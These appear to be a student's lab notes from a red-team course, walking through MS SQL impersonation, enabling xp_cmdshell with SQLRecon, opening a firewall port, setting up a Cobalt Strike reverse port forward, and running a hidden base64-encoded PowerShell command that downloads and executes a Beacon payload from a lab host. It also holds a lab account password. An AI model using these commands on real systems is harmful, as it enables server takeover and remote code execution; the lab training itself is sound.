The _xp_cmdshell_ procedure can be used to execute shell commands on the SQL server if you have sysadmin privileges.  `Invoke-SQLOSCmd` from PowerUpSQL provides a simple means of using it.

`WSL` setup:
setup `sockx5 proxy on 1080` on `WKSTN-2` as `dev\bfarmer`
in `Attacker Desktop` `WSL` session utilize `proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25` to connect to `sql` server, password `Sup3rman`

`beacon` setup:
`powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1` in beacon to `execute` commands below


[[2. MS SQL Impersonation]] to impersonate `DEV\mssql_svc`
```powershell
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:iwhoami /i:DEV\mssql_svc
[*] Tasked beacon to run .NET program: SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:iwhoami /i:DEV\mssql_svc
[+] host called home, sent: 307594 bytes
[+] received output:
[*] Determining user permissions on sql-2.dev.cyberbotic.io,1433 as 'DEV\mssql_svc'
[*] Logged in as DEV\mssql_svc
[*] Mapped to the user dbo
[*] [+] Roles:
 |-> User is a member of public role.
 |-> User is NOT a member of db_owner role.
 |-> User is NOT a member of db_accessadmin role.
 |-> User is NOT a member of db_securityadmin role.
 |-> User is NOT a member of db_ddladmin role.
 |-> User is NOT a member of db_backupoperator role.
 |-> User is NOT a member of db_datareader role.
 |-> User is NOT a member of db_datawriter role.
 |-> User is NOT a member of db_denydatareader role.
 |-> User is NOT a member of db_denydatawriter role.
 |-> User is a member of sysadmin role.
 |-> User is a member of setupadmin role.
 |-> User is a member of serveradmin role.
 |-> User is a member of securityadmin role.
 |-> User is a member of processadmin role.

[12/13 23:23:29] [+] received output:
 |-> User is a member of diskadmin role.
 |-> User is a member of dbcreator role.
 |-> User is a member of bulkadmin role.
```

The _xp_cmdshell_ procedure can be used to execute shell commands on the SQL server if you have sysadmin privileges.  `Invoke-SQLOSCmd` from PowerUpSQL provides a simple means of using it.
what is supposed to happen:
```powershell
beacon> powershell Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults

dev\mssql_svc
```
what actually happened:
```powershell
[12/13 23:24:18] beacon> powerpick Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
[12/13 23:24:18] [+] host called home, sent: 10 bytes
[12/13 23:24:18] [*] Tasked beacon to run: Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults (unmanaged)
[12/13 23:24:18] [+] host called home, sent: 138048 bytes
[12/13 23:24:25] [+] received output:

ComputerName            Instance                     CommandResults         
------------            --------                     --------------         
sql-2.dev.cyberbotic.io sql-2.dev.cyberbotic.io,1433 No sysadmin privileges.
```
The same will fail if you try manually in Heidi or mssqlclient, because xp_cmdshell is disabled.
executed on `WSL` `SQL`
```powershell
SQL> EXEC xp_cmdshell 'whoami';
[-] ERROR(SQL-2): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server.
```

# Continuing with HeidiSQL

ensure `socks 1080` is setup on `beacon`, `proxifier` can be utilized as well

in `powershell` on `ATTACKER DESKTOP` utilize command below to connect to `SQL-2` as `mssql_Svc`

```powershell
PS C:\Users\Attacker> runas /netonly /user:DEV\mssql_svc C:\Tools\HeidiSQL\heidisql.exe
Enter the password for DEV\mssql_svc:Cyberb0tic
Attempting to start C:\Tools\HeidiSQL\heidisql.exe as user "DEV\mssql_svc" ...
PS C:\Users\Attacker>
```
![[Pasted image 20231213183901.png]]
click `NEW` in the bottom left
change `highlighted` settings
where:
`network type` = type of database
`hostname` = hostname of sql server
`port` = 1433
`library` = SQLOLEDB
![[Pasted image 20231213184232.png]]
kept getting `error` with `HEIDISQL` moving onto using `SQLRECON`

# SQLRecon

enabling `xp_cmdshell`
```powershell
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ienablexp /i:DEV\mssql_svc
[*] Tasked beacon to run .NET program: SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ienablexp /i:DEV\mssql_svc
[+] host called home, sent: 307598 bytes
[+] received output:
[*] Enabling xp_cmdshell as 'DEV\mssql_svc' on sql-2.dev.cyberbotic.io,1433
[+] SUCCESS: Enabled xp_cmdshell on sql-2.dev.cyberbotic.io,1433.
name | value | 
---------------
xp_cmdshell | 1 |

```
executing `ipconfig`
```powershell
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig
[*] Tasked beacon to run .NET program: SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig
[+] host called home, sent: 307616 bytes
[+] received output:
[*] Executing 'ipconfig' as 'DEV\mssql_svc' on sql-2.dev.cyberbotic.io,1433.
output | 
---------
 | 
Windows IP Configuration | 
 | 
 | 
Ethernet adapter Ethernet: | 
 | 
   Connection-specific DNS Suffix  . : ec2.internal | 
   IPv4 Address. . . . . . . . . . . : 10.10.122.25 | 
   Subnet Mask . . . . . . . . . . . : 255.255.254.0 | 
   Default Gateway . . . . . . . . . : 10.10.122.1 | 
 |

```
## Reverse Port Forward Setup
With command execution, we can work towards executing a Beacon payload.  As with other servers in the lab, the SQL servers cannot talk directly to our team server in order to download a hosted payload.  Instead, we must setup a reverse port forward to tunnel that traffic through our C2 chain.

run `hostname`
```powershell
beacon> run hostname
[*] Tasked beacon to run: hostname
[+] host called home, sent: 26 bytes
[+] received output:
wkstn-2
```
connect `localhost` to become `SYSTEM` on `WKSTN-2` to change `Firewall rules` & `rportfwd`
```powershell
beacon> connect localhost 4444
[*] Tasked to connect to localhost:4444
[+] host called home, sent: 20 bytes
[+] established link to child beacon: 10.10.123.102
```
`getuid` to show where location is
```powershell
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are NT AUTHORITY\SYSTEM (admin)
```
setting up `firewall` rule to allow port `8080` traffic in to allow `rportfwd` to work
```powershell
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
[*] Tasked beacon to run: New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
[+] host called home, sent: 343 bytes
[+] received output:
#< CLIXML


Name                          : {0021cd7e-392d-4c0a-8f26-6ab13a3c0e0c}
DisplayName                   : 8080-In
Description                   : 
DisplayGroup                  : 
Group                         : 
Enabled                       : True
Profile                       : Any
Platform                      : {}
Direction                     : Inbound
Action                        : Allow
EdgeTraversalPolicy           : Block
LooseSourceMapping            : False
LocalOnlyMapping              : False
Owner                         : 
PrimaryStatus                 : OK
Status                        : The rule was parsed successfully from the store. (65536)
EnforcementStatus             : NotApplicable
PolicyStoreSource             : PersistentStore
PolicyStoreSourceType         : Local
RemoteDynamicKeywordAddresses : 
```
setup for `rportfwd` for all `8080` traffic incoming to `WKSTN-2` to be forward to `80` on the teamserver
```powershell
beacon> rportfwd 8080 127.0.0.1 80
[+] started reverse port forward on 8080 to 127.0.0.1:80
[*] Tasked beacon to forward port 8080 to 127.0.0.1:80
[+] host called home, sent: 10 bytes
```
scanning for `445` to ensure that an `smb` bind will be fine to use because it is open on the target `SQL` server
```powershell
beacon> portscan 10.10.122.25 445
[*] Tasked beacon to scan ports 445 on 10.10.122.25
[+] host called home, sent: 95030 bytes
[+] received output:
(ICMP) Target '10.10.122.25' is alive. [read 8 bytes]
10.10.122.25:445 (platform: 500 version: 10.0 name: SQL-2 domain: DEV)
Scanner module is complete
```
on `cobaltstrike` to host file go to `Site Management` -> `Host File` -> host `smb_x64.ps1` at `/b` on the team server.

We can now download and execute the payload, for example:
`powershell -w hidden -c "iex (new-object net.webclient).downloadstring('http://wkstn-2:8080/b')"`

or base64 encode
`powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBiACcAKQA=`
```powershell
PS C:\Users\Attacker> $str2 = "iex (new-object net.webclient).downloadstring('http://wkstn-2:8080/b')"
PS C:\Users\Attacker> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str2))
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBiACcAKQA=
PS C:\Users\Attacker>
```
### Command Execution
in order to utilize the `command execution` ensure that you are on `WKSTN-2` as `DEV\bfarmer` because `bfarmer` is able to `impersonate` as `mssql_svc`

the command is utilizing `xp_cmdshell`, impersonating `DEV\mssql_svc` and `executing` the command to hit `8080` on `WKSTN-2` which will hit the `rportfwd to 80` on the `teams server 127.00.1` and grab the `smb_x64.ps1`
```powershell
[12/14 00:44:13] beacon> "execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:"powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBiACcAKQA=""
[12/14 00:44:15] [*] Tasked beacon to run .NET program: SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:"powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBiACcAKQA="
[12/14 00:44:15] [+] host called home, sent: 308044 bytes
[12/14 00:44:16] [+] received output:
[*] Executing 'powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBiACcAKQA=' as 'DEV\mssql_svc' on sql-2.dev.cyberbotic.io,1433.

[12/14 00:44:51] [+] received output:
[X] ERROR: Execution Timeout Expired.  The timeout period elapsed prior to completion of the operation or the server is not responding..
```
this will eventually `timeout` however that doesn't matter.

#### Linking to SMB Payload
`link` to the `smb` payload
```powershell
beacon> link sql-2.dev.cyberbotic.io TSVCPIPE-1337imherebitch
[*] Tasked to link to \\sql-2.dev.cyberbotic.io\pipe\TSVCPIPE-1337imherebitch
[+] host called home, sent: 76 bytes
[+] established link to child beacon: 10.10.122.25
```
What payload would you use if port 445 was closed?  Experiment with using the pivot listener here instead of SMB.

